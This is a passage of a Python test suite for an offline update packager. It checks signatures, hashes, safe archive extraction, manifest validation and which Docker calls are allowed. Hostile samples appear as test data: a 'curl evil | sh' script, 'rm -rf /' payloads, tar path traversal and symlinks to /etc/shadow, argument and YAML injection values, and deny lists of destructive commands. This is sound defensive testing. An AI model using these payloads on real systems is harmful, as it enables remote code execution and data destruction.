    assert "merge-base --is-ancestor" in ps and "'--repo', $Root" in ps
    sh = (ROOT / "scripts" / "offline" / "build-package.sh").read_text()
    assert (
        sh.index("check-version")
        < sh.index("docker image inspect")
        < sh.index("docker buildx build")
    )


# --------------------------------------------------------------------------- #
# verify: authenticity first, archive safety, integrity (F-14, F-25, F-26)
# --------------------------------------------------------------------------- #


def test_verify_with_trusted_hash(package, tmp_path):
    pkg, digest = package
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", digest) == 0
    report = json.loads((tmp_path / "x" / "verify-report.json").read_text())
    assert report["result"] == "VERIFIED"
    assert report["package_sha256"] == digest
    pkg_dir = Path(report["package_dir"])
    assert report["manifest_sha256"] == OP.sha256_file(pkg_dir / "manifest.json")


def test_verify_refuses_without_authenticity_and_unpacks_nothing(package, tmp_path):
    pkg, _ = package
    dest = tmp_path / "x"
    assert (
        _verify(pkg, dest, "--allowed-signers", str(tmp_path / "none"))
        == OP.EXIT_VERIFY
    )
    assert not dest.exists()  # F-14: nothing is written before authentication
    assert not list(tmp_path.glob("x.partial-*"))


def test_verify_refuses_wrong_hash_and_unpacks_nothing(package, tmp_path):
    pkg, _ = package
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", "0" * 64) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_refuses_wrong_platform(package, tmp_path):
    pkg, digest = package
    rc = OP.main(
        ["verify", str(pkg), "--extract-to", str(tmp_path / "x"), "--expected-sha256", digest,
         "--platform", "linux/arm64"]
    )  # fmt: skip
    assert rc == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()  # a refused package leaves no tree behind


def test_verify_refuses_unsupported_source_version(package, tmp_path):
    pkg, digest = package
    rc = _verify(
        pkg, tmp_path / "x", "--expected-sha256", digest, "--current-version", "1.0.8"
    )
    assert rc == OP.EXIT_VERIFY


def test_verify_refuses_newer_database(package, tmp_path):
    pkg, digest = package
    rc = _verify(
        pkg, tmp_path / "x", "--expected-sha256", digest, "--current-schema", "34"
    )
    assert rc == OP.EXIT_VERIFY


def _repack(pkg, tmp_path, mutate, refresh_manifest=False):
    """Extract (trusted test helper), mutate, repack -> new package + its hash."""
    work = tmp_path / "work"
    with tarfile.open(pkg) as t:
        t.extractall(work, filter="data")
    top = next(work.iterdir())
    mutate(top)
    if refresh_manifest:  # an attacker who can also rewrite the (unsigned) manifest
        m = json.loads((top / "manifest.json").read_text())
        m["files"] = {
            p.relative_to(top).as_posix(): {
                "sha256": OP.sha256_file(p),
                "size": p.stat().st_size,
            }
            for p in sorted(top.rglob("*"))
            if p.is_file()
            and p.name not in ("manifest.json", "manifest.json.sig", "SHA256SUMS")
        }
        m["image"]["archive_sha256"] = m["files"][m["image"]["archive"]]["sha256"]
        (top / "manifest.json").write_text(json.dumps(m))
        (top / "SHA256SUMS").write_text(OP.render_sums(m["files"]))
    tmp_path.mkdir(parents=True, exist_ok=True)
    new = tmp_path / "mutated.tar.gz"
    with tarfile.open(new, "w:gz") as t:
        t.add(top, arcname=top.name)
    return new, OP.sha256_file(new)


def test_verify_detects_corrupted_image(package, tmp_path):
    pkg, _ = package

    def corrupt(top):
        f = top / "images" / "chatbot5400-1.3.0-rc.1.tar"
        f.write_bytes(f.read_bytes() + b"x")

    new, digest = _repack(pkg, tmp_path, corrupt)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_detects_extra_and_missing_files(package, tmp_path):
    pkg, _ = package
    new, digest = _repack(
        pkg, tmp_path, lambda top: (top / "scripts" / "evil.sh").write_text("rm -rf /")
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    new, digest = _repack(
        pkg, tmp_path / "b", lambda top: (top / "scripts" / "update.sh").unlink()
    )
    assert _verify(new, tmp_path / "y", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_verify_detects_invalid_manifest(package, tmp_path):
    pkg, _ = package

    def bad(top):
        m = json.loads((top / "manifest.json").read_text())
        del m["database"]
        (top / "manifest.json").write_text(json.dumps(m))

    new, digest = _repack(pkg, tmp_path, bad)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY

    new, digest = _repack(
        pkg, tmp_path / "c", lambda top: (top / "manifest.json").write_text("{not json")
    )
    assert _verify(new, tmp_path / "z", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_verify_refuses_migration_packages(package, tmp_path):
    pkg, _ = package

    def mig(top):
        m = json.loads((top / "manifest.json").read_text())
        m["database"]["migration_required"] = True
        m["database"]["schema_version"] = 34
        (top / "manifest.json").write_text(json.dumps(m))

    new, digest = _repack(pkg, tmp_path, mig)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY


def _image_tar(path, tags, config=NEW_CONFIG):
    name = hashlib.sha256(config.encode()).hexdigest() + ".json"
    manifest = json.dumps(
        [{"Config": name, "RepoTags": tags, "Layers": ["l0/layer.tar"]}]
    )
    with tarfile.open(path, "w") as tar:
        for n, data in (
            ("manifest.json", manifest.encode()),
            (name, config.encode()),
            ("l0/layer.tar", b"layer" * 4000),
        ):
            info = tarfile.TarInfo(n)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))


@pytest.mark.parametrize(
    "tags",
    [
        [TARGET, "surrealdb/surrealdb:v2"],  # would MOVE the database image tag
        [TARGET, "chatbot5400:local"],  # would move the tag the deployment runs
        ["chatbot5400:something-else"],
        [],
    ],
)
def test_verify_refuses_an_image_archive_with_unapproved_tags(package, tmp_path, tags):
    """F-25: `docker load` creates / moves every RepoTag of the archive; only the
    manifest's tag is approved - even when every checksum is consistent."""
    pkg, _ = package
    new, digest = _repack(
        pkg,
        tmp_path,
        lambda top: _image_tar(top / "images" / "chatbot5400-1.3.0-rc.1.tar", tags),
        refresh_manifest=True,
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_refuses_an_archive_holding_another_image(package, tmp_path):
    """F-20: right tag, consistent checksums, but not the image of the manifest."""
    pkg, _ = package
    new, digest = _repack(
        pkg,
        tmp_path,
        lambda top: _image_tar(
            top / "images" / "chatbot5400-1.3.0-rc.1.tar", [TARGET], OTHER_CONFIG
        ),
        refresh_manifest=True,
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_image_archive_identity_docker_and_oci_layouts(tmp_path):
    docker_tar = tmp_path / "d.tar"
    _image_tar(docker_tar, [TARGET])
    ident = OP.image_archive_identity(docker_tar)
    assert ident["layout"] == "docker-archive" and ident["repo_tags"] == [TARGET]
    assert ident["config_digest"] == IMAGE_ID
    assert ident["diff_ids"] == json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]

    oci = tmp_path / "o.tar"
    config = NEW_CONFIG.encode()
    cfg_hex = hashlib.sha256(config).hexdigest()
    image_manifest = json.dumps(
        {"config": {"digest": f"sha256:{cfg_hex}"}, "layers": []}
    ).encode()
    man_hex = hashlib.sha256(image_manifest).hexdigest()
    index = json.dumps(
        {"manifests": [{"digest": f"sha256:{man_hex}",
                        "annotations": {"io.containerd.image.name": TARGET}}]}
    ).encode()  # fmt: skip
    with tarfile.open(oci, "w") as tar:
        for n, data in (
            ("index.json", index),
            (f"blobs/sha256/{man_hex}", image_manifest),
            (f"blobs/sha256/{cfg_hex}", config),
        ):
            info = tarfile.TarInfo(n)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    ident = OP.image_archive_identity(oci)
    assert ident["layout"] == "oci" and ident["repo_tags"] == [TARGET]
    assert ident["config_digest"] == IMAGE_ID

    junk = tmp_path / "junk.tar"
    junk.write_bytes(b"not a tar")
    with pytest.raises(OP.Refused):
        OP.image_archive_identity(junk)


def test_same_image_across_image_stores():
    """R2-06: another image store is recognised by its layers AND its run configuration
    + platform; the layers alone are no identity (12D3 accepted them alone)."""
    run_cfg = OP.run_config_sha256({}, "linux", "amd64")
    image = {"id": IMAGE_ID, "config_digest": IMAGE_ID, "run_config_sha256": run_cfg,
             "diff_ids": json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]}  # fmt: skip
    other = "sha256:" + "9" * 64
    assert OP.same_image(IMAGE_ID, [], image) == "image id"
    assert "layers + run configuration" in OP.same_image(other, image["diff_ids"], image, run_cfg)
    assert OP.same_image(other, image["diff_ids"], image) is None  # layers alone
    for changed in (
        OP.run_config_sha256({"User": "root"}, "linux", "amd64"),
        OP.run_config_sha256({"Entrypoint": ["/bin/sh", "-c", "x"]}, "linux", "amd64"),
        OP.run_config_sha256({}, "linux", "arm64"),
    ):
        assert OP.same_image(other, image["diff_ids"], image, changed) is None
    assert OP.same_image(other, ["sha256:" + "1" * 64], image, run_cfg) is None
    assert OP.same_image(other, [], image) is None


def _evil_tar(tmp_path, build):
    path = tmp_path / "evil.tar.gz"
    with tarfile.open(path, "w:gz") as t:
        build(t)
    return path


def _add(t, name, data=b"x", **kw):
    info = tarfile.TarInfo(name)
    info.size = len(data)
    for k, v in kw.items():
        setattr(info, k, v)
    t.addfile(info, io.BytesIO(data) if info.isfile() else None)


@pytest.mark.parametrize(
    "case",
    ["traversal", "absolute", "symlink", "hardlink", "two_tops", "device", "fifo",
     "duplicate", "duplicate_dir_file", "backslash", "dot_segment"],
)  # fmt: skip
def test_archive_safety(tmp_path, case):
    def build(t):
        _add(t, "pkg/manifest.json", b"{}")
        if case == "traversal":
            _add(t, "pkg/../../etc/cron.d/x")
        elif case == "absolute":
            _add(t, "/etc/passwd")
        elif case == "symlink":
            _add(t, "pkg/link", b"", type=tarfile.SYMTYPE, linkname="/etc/shadow")
        elif case == "hardlink":
            _add(t, "pkg/hard", b"", type=tarfile.LNKTYPE, linkname="pkg/manifest.json")
        elif case == "two_tops":
            _add(t, "other/file")
        elif case == "device":
            _add(t, "pkg/dev", b"", type=tarfile.CHRTYPE)
        elif case == "fifo":
            _add(t, "pkg/fifo", b"", type=tarfile.FIFOTYPE)
        elif case == "duplicate":
            _add(t, "pkg/scripts/update.sh", b"first")
            _add(t, "pkg/scripts/update.sh", b"second")
        elif case == "duplicate_dir_file":
            _add(t, "pkg/scripts", b"", type=tarfile.DIRTYPE)
            _add(t, "pkg/scripts/", b"x")
        elif case == "backslash":
            _add(t, "pkg/..\\..\\x")
        elif case == "dot_segment":
            _add(t, "pkg/./manifest.json")

    pkg = _evil_tar(tmp_path, build)
    dest = tmp_path / "out"
    with pytest.raises(OP.Refused):
        OP.safe_extract(pkg, dest)
    assert not (tmp_path / "etc").exists()
    assert not dest.exists()
    assert not list(tmp_path.glob("out.partial-*"))


def test_archive_bomb_refused(tmp_path, monkeypatch):
    def build(t):
        _add(t, "pkg/zeros", b"\0" * (5 * 1024 * 1024))

    pkg = _evil_tar(tmp_path, build)
    with pytest.raises(OP.Refused, match="compression ratio"):
        OP.safe_extract(pkg, tmp_path / "out")
    monkeypatch.setattr(OP, "MAX_TOTAL_BYTES", 1024)
    monkeypatch.setattr(OP, "MAX_RATIO", 1e9)
    with pytest.raises(OP.Refused, match="expands beyond"):
        OP.safe_extract(pkg, tmp_path / "out2")
    monkeypatch.setattr(OP, "MAX_MEMBERS", 0)
    with pytest.raises(OP.Refused, match="too many"):
        OP.safe_extract(pkg, tmp_path / "out3")


def test_extraction_checks_free_space_first(package, tmp_path, monkeypatch):
    pkg, _ = package
    usage = collections.namedtuple("usage", "total used free")
    monkeypatch.setattr(OP.shutil, "disk_usage", lambda p: usage(10**9, 10**9, 1024))
    with pytest.raises(OP.Refused, match="free space"):
        OP.safe_extract(pkg, tmp_path / "out")
    assert not (tmp_path / "out").exists()


def test_failed_extraction_leaves_no_partial_tree(package, tmp_path, monkeypatch):
    """F-14: disk full / I/O error in the middle -> a refusal, not a traceback, no leftovers."""
    pkg, digest = package
    real_chmod = os.chmod
    seen = []

    def failing_chmod(path, mode):
        seen.append(path)
        if len(seen) == 3:
            raise OSError(28, "No space left on device")
        return real_chmod(path, mode)

    monkeypatch.setattr(OP.os, "chmod", failing_chmod)
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()
    assert not list(tmp_path.glob("x.partial-*"))
    assert not (tmp_path / "verify-report.json").exists()


def test_extract_refuses_a_non_empty_destination(package, tmp_path):
    pkg, digest = package
    dest = tmp_path / "x"
    dest.mkdir()
    (dest / "old").write_text("x")
    assert _verify(pkg, dest, "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert (dest / "old").read_text() == "x"


needs_ssh_keygen = pytest.mark.skipif(
    shutil.which("ssh-keygen") is None, reason="ssh-keygen not installed"
)


@pytest.fixture
def signing(tmp_path):
    key = tmp_path / "release_key"
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", str(key)],
        check=True,
    )
    signers = tmp_path / "allowed_signers"
    signers.write_text(
        f"release@chatbot5400 {(tmp_path / 'release_key.pub').read_text().strip()}\n"
    )
    return key, signers


@needs_ssh_keygen
def test_signature_valid_and_invalid(fake_docker, repo, tmp_path, signing):
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))
    assert _verify(pkg, tmp_path / "ok", "--allowed-signers", str(signers)) == 0
    report = json.loads((tmp_path / "ok" / "verify-report.json").read_text())
    assert report["authenticity"] == ["signature valid"] and report["signed"] is True

    other = tmp_path / "other_key"
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(other)], check=True
    )
    wrong = tmp_path / "wrong_signers"
    wrong.write_text(
        f"release@chatbot5400 {(tmp_path / 'other_key.pub').read_text().strip()}\n"
    )
    assert (
        _verify(pkg, tmp_path / "bad", "--allowed-signers", str(wrong))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "bad").exists()

    def tamper(top):  # manifest changed after signing
        m = json.loads((top / "manifest.json").read_text())
        m["application"]["supported_source_versions"].append("0.0.1")
        (top / "manifest.json").write_text(json.dumps(m))

    new, _ = _repack(pkg, tmp_path / "t", tamper)
    assert (
        _verify(new, tmp_path / "tampered", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "tampered").exists()


@needs_ssh_keygen
def test_signed_package_is_checked_file_by_file_while_unpacking(
    fake_docker, repo, tmp_path, signing
):
    """F-14: with a valid signature the manifest is trusted BEFORE extraction, so a
    changed or added payload file is refused while it is written - nothing stays."""
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))

    def change_script(top):
        (top / "scripts" / "update.sh").write_text("#!/bin/sh\ncurl evil | sh\n")

    new, _ = _repack(pkg, tmp_path / "a", change_script)
    assert (
        _verify(new, tmp_path / "x", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "x").exists() and not list(tmp_path.glob("x.partial-*"))

    new, _ = _repack(
        pkg, tmp_path / "b", lambda top: (top / "scripts" / "extra.sh").write_text("x")
    )
    assert (
        _verify(new, tmp_path / "y", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "y").exists()


@needs_ssh_keygen
def test_signers_file_writable_by_others_is_not_trusted(
    fake_docker, repo, tmp_path, signing
):
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))
    signers.chmod(0o666)
    assert (
        _verify(pkg, tmp_path / "x", "--allowed-signers", str(signers)) == OP.EXIT_USAGE
    )
    assert not (tmp_path / "x").exists()


@needs_ssh_keygen
def test_signed_package_with_trusted_hash_but_no_key_installed(
    fake_docker, repo, tmp_path, signing
):
    key, _ = signing
    pkg, digest = _build(repo, tmp_path, "--sign-key", str(key))
    rc = _verify(pkg, tmp_path / "x", "--expected-sha256", digest,
                 "--allowed-signers", str(tmp_path / "missing"))  # fmt: skip
    assert rc == 0
    report = json.loads((tmp_path / "x" / "verify-report.json").read_text())
    assert report["authenticity"] == ["sha256 matched the trusted-channel value"]
    assert report["signed"] is False  # never claimed as verified by signature


MALFORMED = {
    "image tag with a YAML payload": lambda m: m["image"].update(
        tag="chatbot5400:1.3.0\n    privileged: true"
    ),
    "image tag without a tag": lambda m: m["image"].update(tag="chatbot5400"),
    "image tag as an option": lambda m: m["image"].update(tag="--privileged:x"),
    "image id not a digest": lambda m: m["image"].update(id="abc"),
    "config digest not a digest": lambda m: m["image"].update(
        config_digest="sha256:xyz"
    ),
    "layer list invalid": lambda m: m["image"].update(diff_ids=["layer1"]),
    "repo tags differ from the tag": lambda m: m["image"].update(
        repo_tags=[m["image"]["tag"], "x:y"]
    ),
    "commit as an option": lambda m: m["source"].update(
        commit="--upload-pack=touch /tmp/x"
    ),
    "commit abbreviated": lambda m: m["source"].update(commit="abc1234"),
    "base commit missing": lambda m: m["source"].pop("base_commit"),
    "bundle ref outside our namespace": lambda m: m["source"].update(
        bundle_ref="refs/heads/main"
    ),
    "bundle ref wildcard": lambda m: m["source"].update(
        bundle_ref="refs/cb5400-offline/build/*"
    ),
    "release tag as an option": lambda m: m["application"].update(release_tag="-d"),
    "version with shell text": lambda m: m["application"].update(
        version="1.3.0; rm -rf /"
    ),
    "supported versions invalid": lambda m: m["application"].update(
        supported_source_versions=["1.2.0 x"]
    ),
    "supported versions empty": lambda m: m["application"].update(
        supported_source_versions=[]
    ),
    "schema version as text": lambda m: m["database"].update(schema_version="33"),
    "file path traversal": lambda m: m["files"].update(
        {"../x": {"sha256": "0" * 64, "size": 1}}
    ),
    "file checksum invalid": lambda m: m["files"].update(
        {"scripts/a": {"sha256": "zz", "size": 1}}
    ),
    "format version 1": lambda m: m.update(package_format_version=1),
    "secret in the manifest": lambda m: m["build"].update(note="password=hunter2"),
}


@pytest.mark.parametrize("case", sorted(MALFORMED))
def test_manifest_fields_are_format_checked(package, case):
    """F-12: every value that reaches YAML, git or docker has a checked shape."""
    pkg, _ = package
    manifest = _manifest_of(pkg)
    OP.validate_manifest(copy.deepcopy(manifest))  # the real one is valid
    MALFORMED[case](manifest)
    with pytest.raises(OP.Refused):
        OP.validate_manifest(manifest)


# --------------------------------------------------------------------------- #
# a fake deployment
# --------------------------------------------------------------------------- #


@pytest.fixture
def health_server():
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}/health"
    srv.shutdown()


def _write_minimal_conf(tmp_path):
    """Before any deployment exists: only where the tool keeps its state."""
    (tmp_path / "offline-update.conf").write_text(
        f"STATE_DIR={tmp_path / 'state'}\nALLOWED_SIGNERS={tmp_path / 'no-allowed-signers'}\n"
    )


def _write_conf(tmp_path, deploy, health, **extra):
    maint = tmp_path / "docker-compose.maintenance.yml"
    maint.write_text("services: {}\n")
    conf = tmp_path / "offline-update.conf"
    values = {
        "DEPLOY_DIR": deploy,
        "COMPOSE_PROJECT": "cb-test",
        "COMPOSE_FILES": "docker-compose.yml",
        "DEPLOY_IMAGE_TAG": DEPLOY_TAG,
        "STATE_DIR": tmp_path / "state",
        "ALLOWED_SIGNERS": tmp_path / "no-allowed-signers",
        "MAINTENANCE_OVERRIDE": maint,
        "HEALTH_URL": health,
        "MIN_FREE_GB_EXTRA": "0",
        "JOBS_WAIT_SECONDS": "30",
        **extra,
    }
    conf.write_text("".join(f"{k}={v}\n" for k, v in values.items()))
    return conf


def _set_conf(conf, **values):
    lines = [
        x for x in conf.read_text().splitlines() if x.split("=", 1)[0] not in values
    ]
    conf.write_text("\n".join(lines + [f"{k}={v}" for k, v in values.items()]) + "\n")


def _unpack_on_server(fake, pkg, digest, dest):
    assert _verify(pkg, dest, "--expected-sha256", digest) == 0
    fake.forget_image(
        _manifest_of(pkg)["image"]["tag"]
    )  # the server only gets it by `docker load`
    return next(p for p in dest.iterdir() if p.is_dir())


@pytest.fixture
def deployment(tmp_path, package, fake_docker, health_server, monkeypatch):
    pkg, digest = package
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    (deploy / "docker-compose.yml").write_text("services: {}\n")
    (deploy / ".env").write_text("SURREAL_PASSWORD=do-not-read\n")
    conf = _write_conf(tmp_path, deploy, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    return conf, pkg_dir, deploy


def _server(cmd, conf, pkg_dir, *extra):
    return OP.main([cmd, "--config", str(conf), "--package-dir", str(pkg_dir), *extra])


_BACKUP_SERIAL = itertools.count(1)


def _journal_at(conf):
    state = Path(OP.load_config(str(conf))["STATE_DIR"])
    try:
        data = json.loads((state / "journal.json").read_text())
    except (OSError, ValueError):
        return {}
    return data if isinstance(data, dict) else {}  # a damaged journal can be any JSON


def _apply(conf, pkg_dir, *extra):
    """update --apply as an operator with a site backup procedure runs it (R2-04,
    Phase 12D5): the first run stops the writes, fingerprints the data and asks
    for the backup; the operator takes it then; the second run passes its NEW
    reference (single-use). With BACKUP_CMD one run does both. Returns the code
    of the run that decided."""
    rc = _server("update", conf, pkg_dir, "--apply", *extra)
    steps = _journal_at(conf).get("steps") or [{}]
    if rc == OP.EXIT_UPDATE and steps[-1].get("step") == "BACKUP_requested":
        ref = f"bk-{next(_BACKUP_SERIAL)}"
        rc = _server("update", conf, pkg_dir, "--apply", "--backup-reference", ref, "--backup-verified", *extra)  # fmt: skip
    return rc


def _finish(conf):
    return OP.main(["finish", "--config", str(conf), "--approve", "owner"])


def _rollback(conf, what="app", *extra):
    return OP.main(["rollback", what, "--config", str(conf), *extra])


def _status(conf):
    return OP.main(["status", "--config", str(conf)])


def _journal(tmp_path):
    return json.loads((tmp_path / "state" / "journal.json").read_text())


def _ups(fake, start=0):
    return [c for c in fake.calls()[start:] if c[0] == "compose" and "up" in c]


def _update_ups(fake, start=0):
    """Recreates that started the NEW image (the per-attempt override is in the file list)."""
    return [c for c in _ups(fake, start) if any(x.endswith("override-update.yml") for x in c)]


def _plain_compose_up(deploy, *files):
    """What an operator, a cron job or a boot script does: no override of ours."""
    cmd = ["docker", "compose", "-p", "cb-test", "--project-directory", str(deploy)]
    for f in files or ("docker-compose.yml",):
        cmd += ["-f", str(deploy / f)]
    subprocess.run(cmd + ["up", "-d"], check=True)


SAFE_UP_TAIL = [
    "up", "-d", "--no-deps", "--no-build", "--pull", "never", "--force-recreate", "open_notebook",
]  # fmt: skip
ALLOWED_DOCKER = {"image", "info", "load", "tag", "inspect", "run", "save", "compose"}
ALLOWED_COMPOSE = {"config", "ps", "exec", "up"}


def _compose_verb(call):
    """The compose sub-command: the first token after the global options."""
    i = 1
    while i < len(call):
        if call[i] in (
            "-p",
            "-f",
            "--project-directory",
            "--project-name",
            "--file",
            "--env-file",
        ):
            i += 2
        elif call[i].startswith("-"):
            i += 1
        else:
            return call[i], call[i:]
    return None, []


def _assert_safe_calls(calls):
    """Every recorded Docker call is one the update tool may make (T-02).

    Each condition is its own assert: no `A and B or C`. A compose call may only
    be config / ps / exec / up, and `up` must be EXACTLY the app-only recreate:
    --no-deps --no-build --pull never, nothing else, never the database.
    """
    for c in calls:
        assert c[0] in ALLOWED_DOCKER, c
        if c[0] != "compose":
            continue
        verb, tail = _compose_verb(c)
        assert verb in ALLOWED_COMPOSE, c
        for forbidden in (
            "down",
            "pull",
            "build",
            "prune",
            "rm",
            "restart",
            "stop",
            "kill",
            "create",
            "run",
        ):
            assert verb != forbidden, c
        assert "-v" not in c, c
        assert "--volumes" not in c, c
        assert "--build" not in c, c
        assert "--remove-orphans" not in c, c
        if verb == "up":
            assert tail == SAFE_UP_TAIL, c
        if verb == "exec":
            assert tail[1:3] == ["-T", "open_notebook"], c  # never inside the database


def test_safe_calls_oracle_can_fail():
    """The oracle rejects each dangerous form on its own."""
    base = ["compose", "-p", "x", "-f", "docker-compose.yml"]
    up = ["up", "-d", "--no-deps", "--no-build", "--pull", "never", "--force-recreate"]
    dangerous = [
        base + ["down", "--pull", "never"],
        base + ["down"],
        base + ["pull"],
        base + ["build"],
        base
        + [
            "up",
            "-d",
            "--no-build",
            "--pull",
            "never",
            "--force-recreate",
            "open_notebook",
        ],
        base
        + [
            "up",
            "-d",
            "--no-deps",
            "--pull",
            "never",
            "--force-recreate",
            "open_notebook",
        ],
        base
        + ["up", "-d", "--no-deps", "--no-build", "--force-recreate", "open_notebook"],
        base
        + [
            "up",
            "-d",
            "--no-deps",
            "--no-build",
            "--pull",
            "always",
            "--force-recreate",
            "open_notebook",
        ],
        base + up + ["surrealdb"],
        base + up + ["open_notebook", "surrealdb"],
        base + up + ["-v", "open_notebook"],
        base + up,  # every service
        base + ["up", "-d"],
        base + ["rm", "-f", "open_notebook"],
        base + ["exec", "-T", "surrealdb", "sh"],
        ["system", "prune", "-f"],
        ["volume", "rm", "data"],
        ["pull", "chatbot5400:1.3.0"],
        ["rmi", "chatbot5400:local"],
    ]
    for call in dangerous:
        with pytest.raises(AssertionError):
            _assert_safe_calls([call])
    _assert_safe_calls(
        [
            base + SAFE_UP_TAIL,
            base + ["config", "--format", "json"],
            ["load", "-i", "x.tar"],
        ]
    )


def test_tool_source_has_no_destructive_or_wildcard_commands():
    text = (ROOT / "scripts" / "offline" / "offline_package.py").read_text()
    code = "\n".join(
        line for line in text.splitlines() if not line.strip().startswith(("#", '"'))
    )
    for forbidden in ('"down"', '"pull"', '"prune"', '"rm"', '"rmi"', '"--volumes"', '"restart"',
                      '"reset"', '"--hard"', '"--force"', '"clean"', '"push"', "refs/*", '"+refs'):  # fmt: skip
        assert forbidden not in code, forbidden
    assert ".env" not in "\n".join(
        line for line in code.splitlines() if "open(" in line or "read_text" in line
    )


def test_wrapper_scripts_only_delegate():
    for name in ("verify-package.sh", "preflight.sh", "update.sh", "rollback.sh",
                 "healthcheck.sh", "finish.sh", "status.sh", "pin.sh"):  # fmt: skip
        text = (ROOT / "scripts" / "offline" / name).read_text()
        code = "\n".join(x for x in text.splitlines() if not x.startswith("#"))
        assert "exec python3" in code and "rm -" not in code and "down" not in code


# --------------------------------------------------------------------------- #
# configuration and package trust on the server (F-26)
# --------------------------------------------------------------------------- #


def test_config_writable_by_others_is_refused(deployment):
    conf, _, _ = deployment
    conf.chmod(0o666)
    assert _status(conf) == OP.EXIT_USAGE
    conf.chmod(0o644)
    assert _status(conf) == 0


def test_config_in_a_folder_writable_by_others_is_refused(deployment, tmp_path):
    """F-26 rest (Phase 12D5): whoever can write a folder above the configuration can
    replace it (BACKUP_CMD runs as root) - its folders are checked too; a sticky folder
    such as /tmp may be world-writable."""
    conf, _, _ = deployment
    shared = tmp_path / "shared"
    shared.mkdir()
    moved = shared / "offline-update.conf"
    moved.write_text(conf.read_text())
    moved.chmod(0o600)
    shared.chmod(0o777)
    try:
        with pytest.raises(OP.Refused, match="folder .* writable by group / others"):
            OP.load_config(str(moved))
        shared.chmod(0o1777)  # sticky: nobody else can replace the file
        assert OP.load_config(str(moved))["COMPOSE_PROJECT"] == "cb-test"
    finally:
        shared.chmod(0o755)


def test_compose_files_writable_by_anybody_are_refused(deployment, fake_docker, capsys):
    """F-26 rest: the compose files and the maintenance override decide what Docker runs
    as root. Writable by anybody: preflight, finish and rollback refuse before changing
    anything. Group-writable (Ubuntu user-private groups) is only reported."""
    conf, pkg_dir, deploy = deployment
    compose = deploy / "docker-compose.yml"
    compose.chmod(0o666)
    capsys.readouterr()
    assert _server("preflight", conf, pkg_dir) == OP.EXIT_PREFLIGHT
    assert "writable by anybody" in capsys.readouterr().out
    start = len(fake_docker.calls())
    assert _apply(conf, pkg_dir) == OP.EXIT_PREFLIGHT
    assert not _ups(fake_docker, start)
    compose.chmod(0o664)
    capsys.readouterr()
    assert _server("preflight", conf, pkg_dir) == 0
    assert "WARN compose file ownership" in capsys.readouterr().out
    compose.chmod(0o644)
    maintenance = Path(OP.load_config(str(conf))["MAINTENANCE_OVERRIDE"])
    maintenance.chmod(0o666)
    assert _server("preflight", conf, pkg_dir) == OP.EXIT_PREFLIGHT
    maintenance.chmod(0o644)
    assert _apply(conf, pkg_dir) == 0
    compose.chmod(0o666)
    assert _finish(conf) == OP.EXIT_UPDATE  # refused, nothing changed
    assert _journal_at(conf)["status"] == "awaiting_approval"
    assert OP.main(["rollback", "app", "--config", str(conf)]) == OP.EXIT_UPDATE
    compose.chmod(0o644)
    assert _finish(conf) == 0


def test_config_keys_cannot_be_replaced_through_the_environment(
    deployment, monkeypatch, tmp_path
):
    conf, _, _ = deployment
    monkeypatch.setenv("CB5400_BACKUP_CMD", f"touch {tmp_path / 'owned'}")
    monkeypatch.setenv("CB5400_DEPLOY_DIR", "/somewhere/else")
    cfg = OP.load_config(str(conf))
    assert cfg["BACKUP_CMD"] == "" and cfg["DEPLOY_DIR"] != "/somewhere/else"


def test_package_changed_after_verification_is_refused(deployment):
    """F-26a: the verify report is bound to the manifest; a later edit is noticed."""
    conf, pkg_dir, _ = deployment
    manifest_path = pkg_dir / "manifest.json"
    m = json.loads(manifest_path.read_text())
    m["application"]["supported_source_versions"].append("0.9.0")
    manifest_path.write_text(json.dumps(m))
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )

    (pkg_dir.parent / "verify-report.json").unlink()
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_payload_changed_after_verification_is_refused(deployment):
    conf, pkg_dir, _ = deployment
    (pkg_dir / "scripts" / "update.sh").write_text("#!/bin/sh\nexit 0\n")
